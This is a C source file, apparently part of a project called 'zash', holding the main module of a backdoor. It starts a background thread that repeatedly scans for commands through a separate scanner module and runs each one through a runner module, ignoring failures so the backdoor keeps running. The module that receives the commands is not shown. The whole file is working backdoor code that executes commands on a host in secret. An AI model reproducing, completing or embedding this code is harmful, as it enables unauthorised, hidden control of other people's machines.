/**
 * @brief This module run the backdoor. the backdoor read commands and execute them.
 * @aouther Z.F
 * @date 18/3/2020
 */

/** Headers ***************************************************/
#include <stdlib.h>
#include <common.h>

#include "vector/vector.h"
#include "runner/runner.h"
#include "scanner/scanner.h"

#include "backdoor.h"
#include "backdoor_internal.h"


/** Functions ************************************************/
enum zash_status
backdoor_run_commands(const struct SCANNER_data *const commands[], size_t commands_amount)
{
    enum zash_status status = ZASH_STATUS_UNINITIALIZED;

    size_t i = 0;

    /* Run all of the commands. */
    for (i = 0; i < commands_amount; ++i) {
        /* Run the command. ignore return value - the backdoor
         * should continue even if a command has failed. */
        (void) RUNNER_run(commands[i]->id,
                          commands[i]->argv->array_size,
                          (char **) commands[i]->argv->array);
    }

    /* Indicate Success */
    status = ZASH_STATUS_SUCCESS;

    return status;
}


enum zash_status backdoor_main_loop(const bool *should_stop)
{
    enum zash_status status = ZASH_STATUS_UNINITIALIZED;
    enum zash_status temp_status = ZASH_STATUS_UNINITIALIZED;

    struct SCANNER_context *scanner = NULL;
    struct VECTOR_context *commands = NULL;

    /* Check for valid parameters */
    if (NULL == should_stop) {
        status = ZASH_STATUS_BACKDOOR_MAIN_LOOP_NULL_POINTER;
        DEBUG_PRINT("status: %d", status);
        goto lbl_cleanup;
    }

    /* Create a scanner to scan for commands */
    status = SCANNER_create(&scanner);
    if (ZASH_STATUS_SUCCESS != status) {
        DEBUG_PRINT("status: %d", status);
        goto lbl_cleanup;
    }

    /* Until we should stop, scan for commands and run them. */
    while (false == *should_stop) {

        /* Scan for new commands to run */
        status = SCANNER_scan(scanner, &commands);
        if (ZASH_STATUS_SUCCESS != status) {
            DEBUG_PRINT("status: %d", status);
            goto lbl_cleanup;
        }

        /* Run all commands found */
        status = backdoor_run_commands((const struct SCANNER_data **) commands->array,
                                       commands->array_size);
        if (ZASH_STATUS_SUCCESS != status) {
            DEBUG_PRINT("status: %d", status);
            goto lbl_cleanup;
        }

    }

    /* Indicate Success */
    status = ZASH_STATUS_SUCCESS;

lbl_cleanup:

    /* Destroy the scanner created */
    if (NULL != scanner) {
        temp_status = SCANNER_destroy(scanner);
        ZASH_UPDATE_STATUS(status, temp_status);
    }
    scanner = NULL;

    /* Destroy the vector contains commands */
    if (NULL != commands) {
        temp_status = VECTOR_destroy(commands, (VECTOR_free_func_t) SCANNER_free_data);
        ZASH_UPDATE_STATUS(status, temp_status);
    }

    return status;
}


enum zash_status BACKDOOR_create(struct BACKDOOR_context **context)
{

    enum zash_status status = ZASH_STATUS_UNINITIALIZED;

    struct BACKDOOR_context *temp_context = NULL;

    /* Check for valid parameters */
    if (NULL == context) {
        status = ZASH_STATUS_BACKDOOR_CREATE_NULL_POINTER;
        DEBUG_PRINT("status: %d", status);
        goto lbl_cleanup;
    }

    /* Allocate memory for new context */
    temp_context = HEAPALLOCZ(sizeof(*temp_context));
    if (NULL == temp_context) {
        status = ZASH_STATUS_BACKDOOR_CREATE_CALLOC_FAILED;
        DEBUG_PRINT("status: %d", status);
        goto lbl_cleanup;
    }

    /* Initialize fields */
    temp_context->should_stop = false;
    temp_context->is_thread_running = false;

    /* Transfer Ownership */
    *context = temp_context;
    temp_context = NULL;

    /* Indicate Success */
    status = ZASH_STATUS_SUCCESS;

lbl_cleanup:

    HEAPFREE(temp_context);

    return status;
}


enum zash_status BACKDOOR_run(struct BACKDOOR_context *context)
{

    enum zash_status status = ZASH_STATUS_UNINITIALIZED;

    int ptrhead_return_value = C_STANDARD_FAILURE_VALUE;

    /* Check for valid parameters */
    if (NULL == context) {
        status = ZASH_STATUS_BACKDOOR_RUN_NULL_POINTER;
        DEBUG_PRINT("status: %d", status);
        goto lbl_cleanup;
    }

    /* Run the backdoor in a new thread. */
    ptrhead_return_value = pthread_create(&context->thread_id,
                                          NULL,
                                          (backdoor_pthread_func_t) backdoor_main_loop,
                                          &context->should_stop);
    if (C_STANDARD_FAILURE_VALUE == ptrhead_return_value) {
        status = ZASH_STATUS_BACKDOOR_RUN_PTHREAD_CREATE_FAILED;
        DEBUG_PRINT("status: %d", status);
        goto lbl_cleanup;
    }

    /* the new thread is now running. */
    context->is_thread_running = true;

    /* Indicate Success */
    status = ZASH_STATUS_SUCCESS;

lbl_cleanup:

    return status;
}


enum zash_status BACKDOOR_destroy(struct BACKDOOR_context *context)
{

    enum zash_status status = ZASH_STATUS_SUCCESS;
    enum zash_status temp_status = ZASH_STATUS_UNINITIALIZED;

    enum zash_status backdoor_main_loop_return_value = ZASH_STATUS_UNINITIALIZED;
    int ptrhead_return_value = C_STANDARD_FAILURE_VALUE;

    /* if the backdoor is running, stop it. */
    if ((NULL != context) && (true == context->is_thread_running)) {

        /* Make the thread main loop to stop. */
        context->should_stop = true;

        /* wait for the thread to end. */
        ptrhead_return_value = pthread_join(context->thread_id,
                                            (void **) &backdoor_main_loop_return_value);
        if (C_STANDARD_FAILURE_VALUE == ptrhead_return_value) {
            temp_status = ZASH_STATUS_BACKDOOR_DESTROY_PTHREAD_JOIN_FAILED;
            DEBUG_PRINT("status: %d", temp_status);
            ZASH_UPDATE_STATUS(status, temp_status);
        }
        else if (ZASH_STATUS_SUCCESS != backdoor_main_loop_return_value) {
            DEBUG_PRINT("status: %d", backdoor_main_loop_return_value);
            ZASH_UPDATE_STATUS(status, backdoor_main_loop_return_value);
        }

    }
    HEAPFREE(context);

    return status;
}


